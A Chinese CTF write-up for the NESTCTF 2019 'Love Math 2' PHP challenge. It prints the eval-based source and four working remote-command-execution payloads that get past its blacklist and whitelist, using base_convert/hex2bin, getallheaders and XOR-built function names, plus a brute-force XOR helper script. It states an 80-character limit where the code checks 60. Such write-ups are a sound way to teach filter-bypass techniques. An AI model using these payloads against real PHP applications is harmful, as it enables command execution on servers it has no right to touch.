---
title: '[NESTCTF 2019]Love Math 2'
date: 2024-09-25 19:12:06
tags: php特性
categories: 刷题笔记
---

## [NESTCTF 2019]Love Math 2

```
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 60) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

我们进行代码审计

**1.参数c字符数不能超过80个字符**

**2.不能含有空格，\t，\r，\n，\，单双引号，中括号**

**3.使用的单词/函数必须在白名单中**

<!--more->

限制比较严，那就看一下我们常用的一些符号，$,(),{}，=，；，^等，他是我们需要知道的是php中的函数名也是字符串

像$pi、\$cos都是合法变量名。

从可使用的符号中，我们考虑的思路可以是利用数学函数构造变量拼接成动态函数执行命令，也可以考虑使用异或来拼接函数名

我们需要知道

> **PHP函数：**
>
> scandir() 函数：返回指定目录中的文件和目录的数组。
> base_convert() 函数：在任意进制之间转换数字。
> dechex() 函数：把十进制转换为十六进制。
> hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。
> var_dump() ：函数用于输出变量的相关信息。
> readfile() 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。
> 语法：readfile(filename,include_path,context)
>
>  
>
> **动态(可变)函数**
>
> PHP中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数，例如： **$a = "`assert`"; $a."(...)";** 
>
> PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。 可变函数不能用于例如 **eval()** ， **echo** ， **print** ， **unset()** ， **isset()** ， **empty()** ， **include()** ， **require()** 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。
>
>  
>
> **php中函数名默认为字符串**
>
> 例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择
>
>  
>
> *引用自https://www.cnblogs.com/wangtanzhi/p/12246731.html*

这题直接看第四种思路

**第一种思路**（适用于无长度限制的）：利用数学函数运算得到函数和命令

拼接出__GET利用其它参数RCE

```
/index.php?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=<command>
```

```
base_convert(37907361743,10,36) => "hex2bin"
dechex(1598506324) => "5f474554"
$pi=hex2bin("5f474554") => $pi="_GET"   //hex2bin将一串16进制数转换为二进制字符串
($$pi){pi}(($$pi){abs}) => ($_GET){pi}($_GET){abs}  //{}可以代替[]
```



**第二种思路**（适用于无长度限制的）：拼凑出getallheaders利用HeaderRCE

getallheaders — 获取全部 HTTP 请求头信息

getallheaders用法可以参考:https://www.php.net/manual/zh/function.getallheaders.php

```
/index.php?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})
```



**第三种思路**（适用于无长度限制的） 拼凑出exec、system等命令执行函数直接RCE

```
/index.php?c=($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))
//分析：exec('hex2bin(dechex(109270211257898))') => exec('cat f*')

/index.php?c=base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))
//分析：system('cat'.dechex(16)^asinh^pi) => system('cat *')
```



**第四种思路**：利用异或得到函数名和命令

```
<?php
$payload = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
for($k=1;$k<=sizeof($payload);$k++){
    for($i = 0;$i < 9; $i++){
        for($j = 0;$j <=9;$j++){
            $exp = $payload[$k] ^ $i.$j;
            echo($payload[$k]."^$i$j"."==>$exp");
            echo "<br />";
        }
    }
}
```

利用该脚本我们可以利用异或构造出Payload：

```
/index.php?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=<command>
```

